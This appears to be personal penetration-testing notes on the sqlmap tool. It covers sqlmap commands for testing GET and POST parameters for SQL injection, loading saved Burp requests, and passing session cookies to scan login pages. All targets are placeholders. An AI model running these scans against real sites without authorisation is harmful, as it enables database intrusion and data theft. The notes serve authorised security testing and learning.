# SQLMap
> sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.
> sqlmap can be used to confirm the SQL injection vulnerability, to extract the database name, tables, columns, and to gain a full system.

Some websites will have SQL databases connected to them.
- Often a db is used to provide dynamic content and give the user some persistence across sessions.
- WordPress is a common site application that uses a db to store content and user data. 
- When a web application allows user input that interacts with the db, we can attack that.

## Help

[manpage](https://manpages.org/sqlmap) | [cheat sheet](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap) | [important commands](https://www.infosecinstitute.com/resources/penetration-testing/important-sqlmap-commands/)

```
sqlmap -h
# This give you basic help (with usage syntax)

sqlmap -hh
# Advanced help
```
## GET request
```
sqlmap -u http://site-to-test.com/test.php?id=1 -p id
# or
sqlmap -u http://site-to-test.com/test.php?id=1*
```
- `-u`: URL to scan
- `-p`: parameter to scan
- `*`: Parameter to scan (if -p switch is not provided)

## POST request

We can provide the data being passed in the POST request body to scan by the SQLMap tool.
```
sqlmap -u http://site-to-test.com/admin/index.php --data="user=admin&password=admin" -p user --data = POST data
```

Another way is to copy the Burp request into a file and pass the same to SQLMap.
```
sqlmap -r <path to the request file>
```


## Scanning POST login pages




**To get a cookie:**
1. Open up Burp Suite, go to Proxy, turn on Intercept
2. Open Firefox browser and set proxy to Burp (FoxyProxy)
3. Open target website (web page)
4. In Burp you should have intercepted the GET request.
5. In that request should be a line "Cookie: ..." 

```
sqlmap -u "http: // [target ip] / [php line from Burp GET request]" --cookie "[PHPSESSIONID...security_level=0" -p title
```
- `- u`: Target URL (e.g. "http://www.site.com/vuln.php?id=1")  
- `--cookie`: HTTP Cookie header value 
- `-p`: Testable parameter(s) [we took "title" from the PHP value in the URL; that's what we want to test]

Run that. It takes a while. Results should give you some things to try out. 

The "Payload:" items are what you can copy and paste into Burp's Repeater.
